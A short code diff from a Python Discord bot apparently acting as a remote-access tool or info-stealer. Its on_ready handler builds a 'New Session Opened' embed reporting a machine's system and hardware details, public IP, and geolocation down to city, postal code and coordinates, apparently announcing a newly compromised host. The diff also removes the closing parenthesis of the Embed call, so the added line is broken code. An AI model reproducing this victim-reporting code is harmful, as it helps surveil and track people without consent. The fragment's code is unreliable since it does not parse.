@@ -676,7 +676,7 @@ async def on_ready():
 
     if new_embed:
         # Assuming you have an existing embed
-        existing_embed = Embed(title=f"New Session Opened", description=f"**🖥️ System Information:**\n```System: {system}\nNode: {node}\nRelease: {release}\nVersion: {version}\nMachine: {machine}\nProcesser: {processer}\nArchitecture: {architecture}\nPython Version: {python}```\n**💽 Hardware Information:**\n```Physical CPU Cores: {physical_cores}\nLogical CPU Cores: {logical_cores}\nCPU Frequency: {round(current_freq)} MHz\nMemory: {round(total_ram_gb)} GB\nDisk Ussage: {str(round(disk_used)) + "/" + str(round(disk_total))}```\n**🛜 IP Information:**\n```IPv4: {ip}\nTimezone: {timezone}\nCountry: {country}\nState: {state} ({state_code})\nCity: {city}\nPostal Code: {postal}\nLatitude & Longitude: {latlong}```\n**🤖 Discord Information:**")
+        existing_embed = Embed(title=f"New Session Opened", description=f"**🖥️ System Information:**\n```System: {system}\nNode: {node}\nRelease: {release}\nVersion: {version}\nMachine: {machine}\nProcesser: {processer}\nArchitecture: {architecture}\nPython Version: {python}```\n**💽 Hardware Information:**\n```Physical CPU Cores: {physical_cores}\nLogical CPU Cores: {logical_cores}\nCPU Frequency: {round(current_freq)} MHz\nMemory: {round(total_ram_gb)} GB\nDisk Ussage: {str(round(disk_used)) + "/" + str(round(disk_total))}```\n**🛜 IP Information:**\n```IPv4: {ip}\nTimezone: {timezone}\nCountry: {country}\nState: {state} ({state_code})\nCity: {city}\nPostal Code: {postal}\nLatitude & Longitude: {latlong}```\n**🤖 Discord Information:**"
         
         # Merging the new embed's description to the existing one (if applicable)
         if new_embed.description:
